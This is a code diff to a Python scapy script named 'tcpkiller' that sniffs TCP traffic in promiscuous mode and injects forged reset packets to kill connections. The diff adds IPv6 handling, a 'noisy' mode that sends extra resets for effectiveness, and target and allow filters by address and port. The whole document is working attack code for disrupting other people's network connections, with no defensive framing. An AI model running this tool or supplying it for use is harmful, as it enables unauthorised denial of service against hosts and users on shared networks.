@@ -7,9 +7,10 @@ import argparse
 import sys
 import logging
 import os
+import traceback
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
-from scapy.all import Ether, IP, TCP, sendp, conf, sniff
+from scapy.all import Ether, IP, IPv6, TCP, sendp, conf, sniff
 from socket import socket, PF_PACKET, SOCK_RAW
 
 ###############################################################
@@ -76,12 +77,13 @@ parser.add_argument('-ad', '--allow-destination', nargs="*", help="do not attack
 parser.add_argument('-t', '--target', nargs="*", help="actively target given ip address, whether it is the source or destination of a packet",metavar='')
 parser.add_argument('-ts', '--target-source', nargs="*", help="actively target this ip address, but only if it's the source",metavar='')
 parser.add_argument('-td', '--target-destination', nargs="*", help="actively target this ip address, but only if it's the destination of a packet",metavar='')
-parser.add_argument('-q', '--allow-port', nargs="*", help="do not attack any connections involving this port, whether it's the source or destination of a packet",metavar='')
-parser.add_argument('-qs', '--allow-source-port', nargs="*", help="do not attack any connections involving this port, but only if it's the source of a packet",metavar='')
-parser.add_argument('-qd', '--allow-destination-port', nargs="*", help="do not attack any connections involving this port, but only if it's the destination of a packet",metavar='')
+parser.add_argument('-o', '--allow-port', nargs="*", help="do not attack any connections involving this port, whether it's the source or destination of a packet",metavar='')
+parser.add_argument('-os', '--allow-source-port', nargs="*", help="do not attack any connections involving this port, but only if it's the source of a packet",metavar='')
+parser.add_argument('-od', '--allow-destination-port', nargs="*", help="do not attack any connections involving this port, but only if it's the destination of a packet",metavar='')
 parser.add_argument('-p', '--target-port', nargs="*", help="actively target any connections involving these ports whether it is the source or destination of a packet",metavar='')
 parser.add_argument('-ps', '--target-source-port', nargs="*", help="actively target any connections involving this port, but only if it's the source",metavar='')
 parser.add_argument('-pd', '--target-destination-port', nargs="*", help="actively target any connections involving this port, but only if it's the destination of a packet",metavar='')
+parser.add_argument('-n', '--noisy', help="sends many more packets to attempt connection resets to increase effectiveness", default=False, action="store_true")
 parser.add_argument('-v', '--verbose', help="verbose output", default=False, action="store_true")
 
 if __name__ == "__main__":
@@ -93,10 +95,12 @@ if __name__ == "__main__":
 args = vars(parser.parse_args())
 validate_args(args)
 
-print("[*] Initialized tcpkiller")
-
 iface = args["interface"]
 verbose = args["verbose"]
+noisy = args["noisy"]
+
+print("[*] Initialized tcpkiller on %s in %s mode. Press Ctrl-C to exit." %(iface, ("noisy" if noisy else "quiet")))
+
 
 ###############################################################
 # Packet Handling                                             #
@@ -104,14 +108,19 @@ verbose = args["verbose"]
 
 # Given command line arguements, method determines if this packet should be responded to
 def ignore_packet(packet):
-    pass
+    return False
 
 def send(packet):
     socket.send(packet)
 
-def build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq):
+def build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, proto):
     eth = Ether(src=src_mac, dst=dst_mac, type=0x800)
-    ip = IP(src=src_ip, dst=dst_ip)
+    if proto == IP:
+        ip = IP(src=src_ip, dst=dst_ip)
+    elif proto == IPv6:
+        ip = IPv6(src=src_ip, dst=dst_ip)
+    else:
+        return str(eth) #if unknown L2 protocol, send back dud ether packet
     tcp = TCP(sport=src_port, dport=dst_port, seq=seq, flags="R")
     return str(eth/ip/tcp)
 
@@ -121,24 +130,26 @@ def build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq):
 
 def callback(packet):
     flags = packet.sprintf("%TCP.flags%")
-    if not "R" in flags:
+    proto = IP
+    if IPv6 in packet:
+         proto = IPv6
+    if flags == "A" and not ignore_packet(packet):
         src_mac = packet[Ether].src
         dst_mac = packet[Ether].dst
-        src_ip = packet[IP].src
-        dst_ip = packet[IP].dst
+        src_ip = packet[proto].src
+        dst_ip = packet[proto].dst
         src_port = packet[TCP].sport
         dst_port = packet[TCP].dport
         seq = packet[TCP].seq
         ack = packet[TCP].ack
         if verbose:
             print("RST from %s:%s (%s) --> %s:%s (%s) w/ %s" % (src_ip, src_port, src_mac, dst_ip, dst_port, dst_mac, ack))
-        send(build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq))
-        send(build_packet(dst_mac, src_mac, dst_ip, src_ip, dst_port, src_port, ack))
- 
+        if noisy:
+            send(build_packet(src_mac, dst_mac, src_ip, dst_ip, src_port, dst_port, seq, proto))
+        send(build_packet(dst_mac, src_mac, dst_ip, src_ip, dst_port, src_port, ack, proto))
+
 socket = socket(PF_PACKET, SOCK_RAW)
 socket.bind((iface, 0))
 
 conf.sniff_promisc = True
 sniff(filter='tcp', prn=callback, store=0)
-
-socket.close()
